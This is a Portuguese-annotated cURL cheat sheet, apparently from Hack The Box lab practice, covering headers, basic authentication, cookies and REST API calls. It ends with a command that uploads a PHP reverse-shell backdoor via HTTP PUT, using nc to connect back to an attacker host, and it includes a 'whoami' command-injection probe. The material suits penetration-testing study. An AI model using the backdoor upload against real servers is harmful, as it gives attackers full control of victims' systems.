Comandos do cURL:

curl -i http://<SERVER_IP>:<PORT>/ <-- Verificar os headers
curl -u admin:admin http://<SERVER_IP>:<PORT>/ <-- Passar usuário e senha
curl http://admin:admin@<SERVER_IP>:<PORT>/ <-- Passando as credenciais diretamente na URL
curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/ <-- Utilizando autorização basica manualmente onde usuário e senha estão em base64
curl 'http://<SERVER_IP>:<PORT>/search.php?search=le' -H 'Authorization: Basic YWRtaW46YWRtaW4=' <-- Acessando uma pagina responsiva.
curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/ <-- Encaminhando post via Curl nesse caso aqui podemos utilizar também -L para seguir os redirects
curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/ -i
curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/ <-- Para configurarmos o cookie
curl -X POST -d '{"search":"flag"}' -b 'PHPSESSID=vgps0t7t87drsom5nsv8iirk17' -H 'Content-Type: application/json' http://94.237.62.147:46144/search.php <-- Login através do metodo post com um cookie autenticado e aplicação json
curl -s http://<SERVER_IP>:<PORT>/api.php/city/london | jq <-- Realizando uma pesquisa em API com o JSON já formatado com jq
curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' <-- Para adicionar um novo campo na API
curl -s http://<SERVER_IP>:<PORT>/api.php/city/HTB_City | jq
curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' <-- Esse metodo é utilizado para atualizar todos os dados 
curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City <-- Comando para deletar uma entrada na API
curl -X POST --data "code=whoami" http://<SERVER IP>:<PORT>/verify
# List the methods allowed
curl -X OPTIONS http://<SERVER IP> -v
# Use cookie
curl http://<SERVER IP> -b "JSESSIONID=cookievalue"
#Exploiting PUT method
# The PUT method is particularly dangerous. If you upload arbitrary files within the web root, the first target is to create a backdoor script on the server that will be executed by a server-side module,
thereby giving the attacker full control of the application, and often the web server itself. For this example a will create a PHP reverse connection
curl -X PUT -d '<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f"); ?>' [http://<SERVER IP>/test/reverse\_shell.php](http://<SERVER IP>/test/reverse%5C_shell.php) -v
